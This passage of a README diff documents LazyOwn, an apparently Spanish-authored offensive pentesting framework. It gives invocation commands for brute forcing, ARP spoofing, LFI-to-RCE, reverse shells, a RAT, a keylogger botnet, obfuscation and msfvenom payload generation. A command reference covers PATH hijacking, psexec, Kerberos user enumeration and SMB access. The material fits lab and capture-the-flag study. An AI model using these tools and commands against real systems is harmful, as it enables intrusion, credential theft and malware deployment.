+class="sourceCode sh"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> BRUTE_FORCE <span class="at">--url</span> http://10.10.10.10 <span class="at">--wordlist</span> /usr/share/wordlists/rockyou.txt</span></code></pre></div>
+<p>Asegúrate de ajustar los parámetros según tus necesidades y de que
+los valores que pases a las opciones sean válidos para cada caso.</p>
+<h2 id="uso-modo-arpspoofing">Uso modo ARPSpoofing</h2>
+<p>el script provee de un ataque de ARPSpoofing mediante scapy en el
+payload debe ser seteado el lhost rhost y el device que pondràs a
+arpspoofear</p>
+<div class="sourceCode" id="cb36"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> rhost 192.168.1.100</span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> lhost 192.168.1.1</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> device eth0</span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazyarpspoofing</span></code></pre></div>
+<h2 id="uso-modo-lazygathering">Uso modo LazyGathering</h2>
+<p>script que nos provee una visión de rayos x en cuanto al sistema en
+cuestion donde estamos ejecutando la herramiente</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<div class="sourceCode" id="cb37"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazygath</span></code></pre></div>
+<h2 id="uso-modo-lazy-own-lfi-rfi-2-rce">Uso modo Lazy Own Lfi Rfi 2
+Rce</h2>
+<p>El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a
+los parametros de payload.json</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<div class="sourceCode" id="cb38"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazylfi2rce</span></code></pre></div>
+<h2 id="uso-modo-lazyown-sniffer">Uso modo LazyOwn Sniffer</h2>
+<p><a href="https://www.youtube.com/watch?v=_-DDiiMrIlE"
+class="uri">https://www.youtube.com/watch?v=_-DDiiMrIlE</a></p>
+<p>El modo sniffer nos permite capturar el trafico de red por interfaces
+con la opcion -i que es la opción obligatoria, dentro de muchas tras
+opciones no obligatorias, usage: lazysniff.py [-h] -i INTERFACE [-c
+COUNT] [-f FILTER] [-p PCAP] lazysniff.py: error: the following
+arguments are required: -i/–interface</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe"
+alt="Captura de pantalla 2024-06-05 031231" />
+<figcaption aria-hidden="true">Captura de pantalla 2024-06-05
+031231</figcaption>
+</figure>
+<p>usando desde el framework se debe setear device con set device [eth0,
+wla0,eth1, wlan1, etc] segun sea su interface y luego:</p>
+<div class="sourceCode" id="cb39"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazysniff</span></code></pre></div>
+<h2 id="uso-modo-lazyatack">Uso modo LazyAtack</h2>
+<p>Este script de pentesting en Bash permite ejecutar una serie de
+pruebas de seguridad en modo servidor (máquina víctima) o en modo
+cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece
+diferentes opciones y funcionalidades para llevar a cabo diversas
+acciones de prueba de penetración.</p>
+<p>Opciones del Script Modo Servidor:</p>
+<p>Ejecuta en la máquina víctima. Ofrece opciones como iniciar un
+servidor HTTP, configurar netcat para escuchar conexiones, enviar
+archivos mediante netcat, configurar una shell reversa, entre otros.
+Modo Cliente:</p>
+<p>Ejecuta en la máquina atacante. Ofrece opciones como descargar listas
+de SecLists, escanear puertos, enumerar servicios HTTP, verificar
+conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
+Ejemplos de Uso Uso Básico</p>
+<div class="sourceCode" id="cb40"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyatack.sh</span> <span class="at">--modo</span> servidor <span class="at">--ip</span> 192.168.1.1 <span class="at">--atacante</span> 192.168.1.100</span></code></pre></div>
+<div class="sourceCode" id="cb41"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyatack.sh</span> <span class="at">--modo</span> cliente <span class="at">--url</span> http://victima.com <span class="at">--ip</span> 192.168.1.10</span></code></pre></div>
+<p>Esto ejecuta el script en modo cliente, configurando la URL de la
+víctima como <a href="http://victima.com"
+class="uri">http://victima.com</a> y la IP de la víctima como
+192.168.1.10.</p>
+<h2 id="funciones-del-script">Funciones del Script</h2>
+<pre><code>Funciones del Script
+Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
+Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
+Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
+Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
+Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
+Configurar Netcat: Configura netcat para escuchar en el puerto 443.
+Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
+Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
+Verificar Conectividad con Curl: Verifica la conectividad usando curl.
+Configurar Shell Reversa: Configura una shell reversa.
+Escuchar Shell con Netcat: Escucha una shell con netcat.
+Monitorear Procesos: Monitorea los procesos en ejecución.
+Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
+Comprobar Permisos Sudo: Comprueba los permisos de sudo.
+Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
+Configurar TTY: Configura TTY para una sesión shell más estable.
+Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
+Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
+Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
+Listar Timers de Systemd: Lista timers de systemd.
+Comprobar Rutas de Comandos: Comprueba rutas de comandos.
+Abusar de Tar: Abusa de tar para ejecutar una shell.
+Enumerar Puertos Abiertos: Enumera puertos abiertos.
+Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
+Escanear Red: Escanea la red con secuencia y xargs.</code></pre>
+<h2 id="experimental-lazyownwebshell-en-python">Experimental
+LazyOwnWebShell en python</h2>
+<p>Corre en <a href="http://localhost:5000"
+class="uri">http://localhost:5000</a> experimental, ya que aun no
+funciona la salida de la webshell de cara al navegador. pero los
+comandos si son ejecutados correctamente. por eso está en modo
+experimental… por no decir que aun tiene bugs xD</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd"
+alt="Captura de pantalla 2024-06-09 030335" />
+<figcaption aria-hidden="true">Captura de pantalla 2024-06-09
+030335</figcaption>
+</figure>
+<div class="sourceCode" id="cb43"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> main.py </span></code></pre></div>
+<h2 id="experimental-ofuscación-mediante-pyinstaller">Experimental
+ofuscación mediante pyinstaller</h2>
+<p>esto está en modo experimental y no funciona del todo, ya que tiene
+un problema de rutas. pronto ya contará con ofuscación mediante
+pyinstaller</p>
+<div class="sourceCode" id="cb44"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./py2el.sh</span></span></code></pre></div>
+<h2 id="experimental-exploit-netbios">Experimental exploit netbios</h2>
+<p>esto está en modo experimental ya que aun no funciona… (proximamente
+quizas una implementacion de eternalblue entre otras cositas…)</p>
+<div class="sourceCode" id="cb45"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazynetbios</span></code></pre></div>
+<h2
+id="experimental-lazybotnet-con-keylogger-para-windows-y-linux">Experimental
+LazyBotNet con keylogger para windows y Linux</h2>
+<p>esto está en modo experimental y no funciona la desencriptación del
+log del keylogger xD acá vemos por primera vez en accion el comando
+payload el cual nos setea toda la config en nuestro payload.json así
+podemos precargar la config antes de arrancar con el framework</p>
+<div class="sourceCode" id="cb46"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span></span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazybotnet</span></code></pre></div>
+<h2 id="menús-interactivos">Menús Interactivos</h2>
+<p>El script presenta menús interactivos para seleccionar las acciones a
+realizar. En modo servidor, muestra opciones relevantes para la máquina
+víctima, y en modo cliente, muestra opciones relevantes para la máquina
+atacante.</p>
+<p>Interrupción Limpia El script maneja la señal SIGINT (usualmente
+generada por Control + C) para salir limpiamente.</p>
+<h2 id="licencia">Licencia</h2>
+<p>Este proyecto está licenciado bajo la Licencia GPL v3. La información
+contenida en GTFOBins es propiedad de sus autores, a quienes se les
+agradece enormemente por la información proporcionada.</p>
+<h2 id="agradecimientos">Agradecimientos</h2>
+<p>Un agradecimiento especial a <a
+href="https://gtfobins.github.io/">GTFOBins</a> por la valiosa
+información que proporcionan y a ti por utilizar este proyecto. Tambien
+¡Gracias por tu apoyo Tito S4vitar! quien hace una tarea extraordinarìa
+de divulgaciòn. por supuesto que utilizo la funcion extractPorts en mi
+.zshrc :D</p>
+<h3 id="agradecimientos-a-pwntomate">Agradecimientos a pwntomate 🍅</h3>
+<p>una excelente herramienta que adapte un poco para que funcione con el
+proyecto todos los creditos son de su autor honze-net Andreas Hontzia
+visiten y denle amor al proyecto <a
+href="https://github.com/honze-net/pwntomate"
+class="uri">https://github.com/honze-net/pwntomate</a></p>
+<h2 id="abstract">Abstract</h2>
+<p>LazyOwn es un marco de trabajo que agiliza el flujo del mismo y
+automatiza muchas tareas y pruebas mediante alias y distintas
+herramientas es como una navaja multiproposito con navajas
+multipropisitos para el hacking xD</p>
+<h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
+Documentation by readmeneitor.py</h1>
+<p>Documentación creada automaticamente por el script readmeneitor.py
+creado para este proyecto, quizas algún día tenga su propio repo por
+ahora no lo veo necesario.</p>
+<h1 id="commands.md-documentation-by-readmeneitor.py-1">COMMANDS.md
+Documentation by readmeneitor.py</h1>
+<h2 id="xor_encrypt_decrypt">xor_encrypt_decrypt</h2>
+<p>XOR Encrypt or Decrypt data with a given key</p>
+<h2 id="init"><strong>init</strong></h2>
+<p>Initializer for the LazyOwnShell class.</p>
+<p>This method sets up the initial parameters and scripts for an
+instance of the LazyOwnShell class. It initializes a dictionary of
+parameters with default values and a list of script names that are part
+of the LazyOwnShell toolkit.</p>
+<p>Attributes: params (dict): A dictionary of parameters with their
+default values. scripts (list): A list of script names included in the
+toolkit. output (str): An empty string to store output or results.</p>
+<h2 id="default">default</h2>
+<p>Handles undefined commands, including aliases.</p>
+<p>This method checks if a given command (or its alias) exists within
+the class by attempting to find a corresponding method. If the command
+or alias is not found, it prints an error message.</p>
+<p>:param line: The command or alias to be handled. :type line: str
+:return: None</p>
+<h2 id="one_cmd">one_cmd</h2>
+<p>Internal function to execute commands.</p>
+<p>This method attempts to execute a given command using
+<code>onecmd</code> and captures the output. It sets the
+<code>output</code> attribute based on whether the command was executed
+successfully or an exception occurred.</p>
+<p>:param command: The command to be executed. :type command: str
+:return: A message indicating the result of the command execution.
+:rtype: str</p>
+<h2 id="set">set</h2>
+<p>Set a parameter value.</p>
+<p>This function takes a line of input, splits it into a parameter and a
+value, and sets the specified parameter to the given value if the
+parameter exists.</p>
+<p>:param line: A string containing the parameter and value to be set.
+Expected format: ‘<parameter> <value>’. :type line: str :return: None
+:raises: ValueError if the input line does not contain exactly two
+elements.</p>
+<h2 id="show">show</h2>
+<p>Show the current parameter values.</p>
+<p>This function iterates through the current parameters and their
+values, printing each parameter and its associated value.</p>
+<p>:param line: This parameter is not used in the function. :type line:
+str :return: None</p>
+<h2 id="list">list</h2>
+<p>Lists all available scripts in the modules directory.</p>
+<p>This method prints a list of available scripts in a formatted manner,
+arranging them into columns. It shows each script with sufficient
+spacing for readability.</p>
+<p>:param line: This parameter is not used in the method. :type line:
+str :return: None</p>
+<h2 id="run">run</h2>
+<p>Runs a specific LazyOwn script.</p>
+<p>This method executes a script from the LazyOwn toolkit based on the
+provided script name. If the script is not recognized, it prints an
+error message. To see available scripts, use the <code>list</code> or
+<code>help list</code> commands.</p>
+<p>:param line: The command line input containing the script name. :type
+line: str :return: None</p>
+<h2 id="lazysearch">lazysearch</h2>
+<p>Runs the internal module <code>modules/lazysearch.py</code>.</p>
+<p>This method executes the <code>lazysearch</code> script from the
+specified path, using the <code>binary_name</code> parameter from the
+<code>self.params</code> dictionary. If <code>binary_name</code> is not
+set, it prints an error message.</p>
+<p>:return: None</p>
+<h2 id="lazysearch_gui">lazysearch_gui</h2>
+<p>Run internal module modules/LazyOwnExplorer.py</p>
+<h2 id="lazyown-1">lazyown</h2>
+<p>Run internal module modules/lazyown.py</p>
+<h2 id="update_db">update_db</h2>
+<p>Run internal module modules/update_db.sh to update the db of binary
+exploitables from gtofbins</p>
+<h2 id="lazynmap">lazynmap</h2>
+<p>Runs the internal module <code>modules/lazynmap.sh</code> for
+multiple Nmap scans.</p>
+<p>This method executes the <code>lazynmap</code> script, using the
+current working directory and the <code>rhost</code> parameter from the
+<code>self.params</code> dictionary as the target IP. If
+<code>rhost</code> is not set, it prints an error message.</p>
+<p>:return: None</p>
+<h2 id="lazywerkzeugdebug">lazywerkzeugdebug</h2>
+<p>test werkzeug in debugmode Run internal module
+modules/lazywerkzeug.py</p>
+<h2 id="lazygath">lazygath</h2>
+<p>Run internal module modules/lazygat.sh</p>
+<h2 id="lazynmapdiscovery">lazynmapdiscovery</h2>
+<p>Runs the internal module <code>modules/lazynmap.sh</code> with
+discovery mode.</p>
+<p>This method executes the <code>lazynmap</code> script in discovery
+mode. It uses the current working directory for locating the script.</p>
+<p>:return: None</p>
+<h2 id="lazysniff">lazysniff</h2>
+<p>Runs the internal module <code>modules/lazysniff.py</code>.</p>
+<p>This method executes the <code>lazysniff</code> script with the
+specified network device from the <code>device</code> parameter in
+<code>self.params</code>. It sets environment variables for language and
+terminal type and uses <code>subprocess.run</code> to handle the
+execution.</p>
+<p>:return: None</p>
+<h2 id="lazyftpsniff">lazyftpsniff</h2>
+<p>Run internal module modules/lazyftpsniff.py</p>
+<h2 id="lazynetbios">lazynetbios</h2>
+<p>Run internal module modules/lazynetbios.py</p>
+<h2 id="lazyhoneypot">lazyhoneypot</h2>
+<p>Run internal module modules/lazyhoneypot.py</p>
+<h2 id="lazygptcli">lazygptcli</h2>
+<p>Run internal module modules/lazygptcli.py</p>
+<h2 id="lazysearch_bot">lazysearch_bot</h2>
+<p>Run internal module modules/lazysearch_bot.py</p>
+<h2 id="lazymetaextract0r">lazymetaextract0r</h2>
+<p>Run internal module modules/lazyown_metaextract0r.py</p>
+<h2 id="lazyownratcli">lazyownratcli</h2>
+<p>Run internal module modules/lazyownclient.py</p>
+<h2 id="lazyownrat">lazyownrat</h2>
+<p>Run internal module modules/lazyownserver.py</p>
+<h2 id="lazybotnet">lazybotnet</h2>
+<p>Run internal module modules/lazybotnet.py</p>
+<h2 id="lazylfi2rce">lazylfi2rce</h2>
+<p>Run internal module modules/lazylfi2rce.py</p>
+<h2 id="lazylogpoisoning">lazylogpoisoning</h2>
+<p>Run internal module modules/lazylogpoisoning.py</p>
+<h2 id="lazybotcli">lazybotcli</h2>
+<p>Run internal module modules/lazybotcli.py</p>
+<h2 id="lazyssh77enum">lazyssh77enum</h2>
+<p>Run internal module modules/lazybrutesshuserenum.py</p>
+<h2 id="lazyburpfuzzer">lazyburpfuzzer</h2>
+<p>Run internal module modules/lazyown_burpfuzzer.py</p>
+<h2 id="lazyreverse_shell">lazyreverse_shell</h2>
+<p>Run internal module modules/lazyreverse_shell.sh</p>
+<h2 id="lazyarpspoofing">lazyarpspoofing</h2>
+<p>Run internal module modules/lazyarpspoofing.py</p>
+<h2 id="lazyattack">lazyattack</h2>
+<p>Run internal module modules/lazyatack.sh</p>
+<h2 id="lazymsfvenom">lazymsfvenom</h2>
+<p>Runs the <code>msfvenom</code> tool to generate payloads based on
+user input.</p>
+<p>Prompts the user to select a payload type from a list and executes
+the corresponding <code>msfvenom</code> command to generate a payload.
+Moves the generated payloads to a <code>sessions</code> directory and
+sets appropriate permissions. Optionally compresses the payloads using
+UPX and handles a C payload with shikata_ga_nai.</p>
+<p>:param line: Command line arguments for the script. :return: None</p>
+<h2 id="lazyaslrcheck">lazyaslrcheck</h2>
+<p>Checks the status of Address Space Layout Randomization (ASLR) on the
+system by reading the value from
+/proc/sys/kernel/randomize_va_space.</p>
+<p>The function executes the <code>cat</code> command to retrieve the
+ASLR status and prints the result. Based on the retrieved value, it
+indicates whether ASLR is fully activated, partially activated, or
+deactivated.</p>
+<p>:returns: None</p>
+<h2 id="lazypathhijacking">lazypathhijacking</h2>
+<p>Creates a path hijacking attack by performing the following
+steps:</p>
+<ol type="1">
+<li>Appends the value of <code>binary_name</code> to a temporary script
+located at <code>modules/tmp.sh</code>.</li>
+<li>Copies this temporary script to <code>/tmp</code> with the name
+specified by <code>binary_name</code>.</li>
+<li>Sets executable permissions on the copied script.</li>
+<li>Prepends <code>/tmp</code> to the system’s PATH environment variable
+to ensure the script is executed in preference to other binaries.</li>
+</ol>
+<p>The function then prints out each command being executed and a
+message indicating the binary name used for the path hijacking.</p>
+<p>:param binary_name: The name of the binary to be used in the path
+hijacking attack. :returns: None</p>
+<h2 id="script">script</h2>
+<p>Run a script with the given arguments</p>
+<h2 id="command">command</h2>
+<p>Run a command and print output in real-time</p>
+<h2 id="payload">payload</h2>
+<p>Load parameters from payload.json</p>
+<h2 id="exit">exit</h2>
+<p>Exit the command line interface.</p>
+<h2 id="fixperm">fixperm</h2>
+<p>Fix Perm LazyOwn shell</p>
+<h2 id="lazywebshell">lazywebshell</h2>
+<p>LazyOwn shell</p>
+<h2 id="getcap">getcap</h2>
+<p>try get capabilities :)</p>
+<h2 id="getseclist">getseclist</h2>
+<p>get seclist :D</p>
+<h2 id="smbclient">smbclient</h2>
+<p>Interacts with SMB shares using the <code>smbclient</code> command to
+perform the following operations:</p>
+<ol type="1">
+<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
+(local host) are set; if not, an error message is displayed.</li>
+<li>If <code>line</code> (share name) is provided:</li>
+</ol>
+<ul>
+<li>Attempts to access the specified SMB share on the remote host using
+the command: <code>smbclient -N \\{rhost}\{line}</code></li>
+</ul>
+<ol start="3" type="1">
+<li>If <code>line</code> is not provided:</li>
+</ol>
+<ul>
+<li>Lists available SMB shares on the remote host with the command:
+<code>smbclient -N -L \\{rhost}</code></li>
+</ul>
+<ol start="4" type="1">
+<li>Suggests a potential SMB exploit if possible by mounting the share
+from the local host using:
+<code>mount -t cifs "//{lhost}/share" /mnt/smb</code></li>
+</ol>
+<p>:param line: The name of the SMB share to access on the remote host.
+If not provided, the function will list all available shares. :returns:
+None</p>
+<h2 id="smbmap">smbmap</h2>
+<p>smbmap -H 10.10.10.3 [OPTIONS] Uses the <code>smbmap</code> tool to
+interact with SMB shares on a remote host:</p>
+<ol type="1">
+<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
+(local host) are set; if not, an error message is displayed.</li>
+<li>If no <code>line</code> (share name or options) is provided:</li>
+</ol>
+<ul>
+<li>Attempts to access SMB shares on the remote host with a default user
+<code>deefbeef</code> using the command:
+<code>smbmap -H {rhost} -u 'deefbeef'</code></li>
+</ul>
+<ol start="3" type="1">
+<li>If <code>line</code> is provided:</li>
+</ol>
+<ul>
+<li>Executes <code>smbmap</code> with the specified options or share
+name using the command: <code>smbmap -H {rhost} -R {line}</code></li>
+</ul>
+<ol start="4" type="1">
+<li>Suggests a potential SMB exploit if possible by mounting the share
+from the local host using:
+<code>mount -t cifs "//{lhost}/documents" /mnt/smb</code></li>
+</ol>
+<p>:param line: Options or share name to use with <code>smbmap</code>.
+If not provided, uses a default user to list shares. :returns: None</p>
+<h2 id="getnpusers">getnpusers</h2>
+<p>sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile
+sessions/users.txt Executes the <code>impacket-GetNPUsers</code> command
+to enumerate users with Kerberos pre-authentication disabled.</p>
+<ol type="1">
+<li>Checks if the <code>line</code> (domain) argument is provided; if
+not, an error message is displayed, instructing the user to provide a
+domain.</li>
+<li>Executes <code>impacket-GetNPUsers</code> with the following
+options:</li>
+</ol>
+<ul>
+<li><code>-no-pass</code>: Skips password prompt.</li>
+<li><code>-usersfile sessions/users.txt</code>: Specifies the file
+containing the list of users to check.</li>
+</ul>
+<p>:param line: The domain to query. Must be provided in the format
+<code>domain.com</code>. Example usage:
+<code>getnpusers domain.com</code> :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: sudo impacket-GetNPUsers <domain> -no-pass -usersfile
+sessions/users.txt Replace <code>&lt;domain&gt;</code> with the actual
+domain name you want to query.</p>
+<h2 id="psexec">psexec</h2>
+<p>Executes the <code>impacket-psexec</code> command to run a remote
+command on a target machine using the <code>administrator</code>
+account.</p>
+<ol type="1">
+<li>Retrieves the target host IP from the <code>rhost</code>
+parameter.</li>
+<li>Checks if the <code>rhost</code> parameter is valid using
+<code>check_rhost()</code>. If invalid, the function returns early.</li>
+<li>Executes the <code>impacket-psexec</code> command with the
+<code>administrator</code> account on the target host.</li>
+</ol>
+<p>:param line: This parameter is not used in this command but is
+included for consistency with other methods. :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: impacket-psexec administrator@<target_host> Replace
+<code>&lt;target_host&gt;</code> with the IP address or hostname of the
+target machine.</p>
+<h2 id="rpcdump">rpcdump</h2>
+<p>Executes the <code>rpcdump.py</code> script to dump RPC services from
+a target host.</p>
+<ol type="1">
+<li>Retrieves the target host IP from the <code>rhost</code>
+parameter.</li>
+<li>Checks if the <code>rhost</code> parameter is valid using
+<code>check_rhost()</code>. If invalid, the function returns early.</li>
+<li>Executes the <code>rpcdump.py</code> script on port 135 and 593 to
+gather RPC service information from the target host.</li>
+</ol>
+<p>:param line: This parameter is not used in this command but is
+included for consistency with other methods. :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: rpcdump.py -p 135 <target_host> rpcdump.py -p 593 <target_host>
+Replace <code>&lt;target_host&gt;</code> with the IP address or hostname
+of the target machine.</p>
+<h2 id="dig">dig</h2>
+<p>Executes the <code>dig</code> command to query DNS information.</p>
+<ol type="1">
+<li>Retrieves the DNS server IP from the <code>line</code> parameter and
+the target host from the <code>rhost</code> parameter.</li>
+<li>If either the DNS server or <code>rhost</code> is not provided, an
+error message is printed.</li>
+<li>Executes the <code>dig</code> command to query the version of the
+DNS server and additional records.</li>
+</ol>
+<p>:param line: DNS server IP or hostname. Must be provided for the
+<code>dig</code> command. :param rhost: Target host for additional
+<code>dig</code> queries.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually run these commands, use the following
+syntax: dig version.bind CHAOS TXT @<dns_server> dig any <domain>
+@<rhost></p>
+<p>Replace <code>&lt;dns_server&gt;</code> with the IP address or
+hostname of the DNS server, <code>&lt;domain&gt;</code> with the target
+domain, and <code>&lt;rhost&gt;</code> with the IP address or hostname
+of the target machine.</p>
+<h2 id="cp">cp</h2>
+<p>Copies a file from the ExploitDB directory to the sessions
+directory.</p>
+<ol type="1">
+<li>Retrieves the path to the ExploitDB directory and the target file
+from the <code>line</code> parameter.</li>
+<li>Copies the specified file from the ExploitDB directory to the
+<code>sessions</code> directory in the current working directory.</li>
+</ol>
+<p>:param line: The relative path to the file within the ExploitDB
+directory. For example, <code>java/remote/51884.py</code>. :param
+exploitdb: The path to the ExploitDB directory. This must be set in
+advance or provided directly.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually copy files, use the following syntax:
+cp <exploitdb_path><file_path> <destination_path></p>
+<p>Replace <code>&lt;exploitdb_path&gt;</code> with the path to your
+ExploitDB directory, <code>&lt;file_path&gt;</code> with the relative
+path to the file, and <code>&lt;destination_path&gt;</code> with the
+path where you want to copy the file.</p>
+<p>For example: cp /usr/share/exploitdb/exploits/java/remote/51884.py
+/path/to/sessions/</p>
+<h2 id="dnsenum">dnsenum</h2>
+<p>Performs DNS enumeration using <code>dnsenum</code> to identify
+subdomains for a given domain.</p>
+<ol type="1">
+<li>Executes the <code>dnsenum</code> command with parameters to specify
+the DNS server, output file, and wordlist for enumeration.</li>
+</ol>
+<p>:param line: The target domain to perform DNS enumeration on, e.g.,
+<code>ghost.htb</code>. :param rhost: The DNS server to use for
+enumeration, e.g., <code>10.10.11.24</code>. :param dnswordlist: The
+path to the DNS wordlist file used for subdomain discovery.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform DNS enumeration, use the
+following command: dnsenum –dnsserver <dns_server> –enum -p 0 -s 0 -o
+<output_file> -f <dns_wordlist> <target_domain></p>
+<p>Replace <code>&lt;dns_server&gt;</code> with the DNS server IP,
+<code>&lt;output_file&gt;</code> with the file path to save the results,
+<code>&lt;dns_wordlist&gt;</code> with the path to your DNS wordlist
+file, and <code>&lt;target_domain&gt;</code> with the domain to be
+enumerated.</p>
+<p>For example: dnsenum –dnsserver 10.10.11.24 –enum -p 0 -s 0 -o
+sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb</p>
+<h2 id="dnsmap">dnsmap</h2>
+<p>Performs DNS enumeration using <code>dnsmap</code> to discover
+subdomains for a specified domain.</p>
+<ol type="1">
+<li>Executes the <code>dnsmap</code> command to scan the given domain
+with a specified wordlist.</li>
+</ol>
+<p>:param line: The target domain to perform DNS enumeration on, e.g.,
+<code>ghost.htb</code>. :param dnswordlist: The path to the wordlist
+file used for DNS enumeration.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform DNS enumeration, use the
+following command: dnsmap <target_domain> -w <dns_wordlist></p>
+<p>Replace <code>&lt;target_domain&gt;</code> with the domain you want
+to scan and <code>&lt;dns_wordlist&gt;</code> with the path to your DNS
+wordlist file.</p>
+<p>For example: dnsmap ghost.htb -w /path/to/dnswordlist.txt</p>
+<h2 id="whatweb">whatweb</h2>
+<p>Performs a web technology fingerprinting scan using
+<code>whatweb</code>.</p>
+<ol type="1">
+<li>Executes the <code>whatweb</code> command to identify technologies
+used by the target web application.</li>
+</ol>
+<p>:param line: This parameter is not used in the current implementation
+but could be used to pass additional options or arguments if needed.
+:param rhost: The target web host to be scanned, specified in the
+<code>params</code> dictionary.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform web technology fingerprinting,
+use the following command: whatweb <target_host></p>
+<p>Replace <code>&lt;target_host&gt;</code> with the URL or IP address
+of the web application you want to scan.</p>
+<p>For example: whatweb example.com</p>
+<h2 id="enum4linux">enum4linux</h2>
+<p>Performs enumeration of information from a target Linux/Unix system
+using <code>enum4linux</code>.</p>
+<ol type="1">
+<li>Executes the <code>enum4linux</code> command with the
+<code>-a</code> option to gather extensive information from the
+specified target.</li>
+</ol>
+<p>:param line: This parameter is not used in the current implementation
+but could be used to pass additional options or arguments if needed.
+:param rhost: The target host for enumeration, specified in the
+<code>params</code> dictionary.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually enumerate information from a Linux/Unix
+system, use the following command: enum4linux -a <target_host></p>
+<p>Replace <code>&lt;target_host&gt;</code> with the IP address or
+hostname of the target system.</p>
+<p>For example: enum4linux -a 192.168.1.10</p>
+<h2 id="nbtscan">nbtscan</h2>
+<p>Performs network scanning using <code>nbtscan</code> to discover
+NetBIOS names and addresses in a specified range.</p>
+<ol type="1">
+<li>Executes the <code>nbtscan</code> command with the <code>-r</code>
+option to scan the specified range of IP addresses for NetBIOS
+information.</li>
+</ol>
+<p>:param line: This parameter is not used in the current implementation
+but could be used to specify additional options or arguments if needed.
+:param rhost: The target network range for scanning, specified in the
+<code>params</code> dictionary.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform a NetBIOS scan across a network
+range, use the following command: sudo nbtscan -r <network_range></p>
+<p>Replace <code>&lt;network_range&gt;</code> with the IP address range
+you want to scan. For example: sudo nbtscan -r 192.168.1.0/24</p>
+<h2 id="rpcclient">rpcclient</h2>
+<p>Executes the <code>rpcclient</code> command to interact with a remote
+Windows system over RPC (Remote Procedure Call) using anonymous
+credentials.</p>
+<ol type="1">
+<li>Runs <code>rpcclient</code> with the <code>-U ''</code> (empty
+username) and <code>-N</code> (no password) options to connect to the
+target host specified by <code>rhost</code>.</li>
+</ol>
+<p>:param line: This parameter is not used in the current implementation
+but could be used to specify additional options or arguments if needed.
+:param rhost: The IP address of the remote host to connect to, specified
+in the <code>params</code> dictionary.</p>
+<p>:returns: None</p>
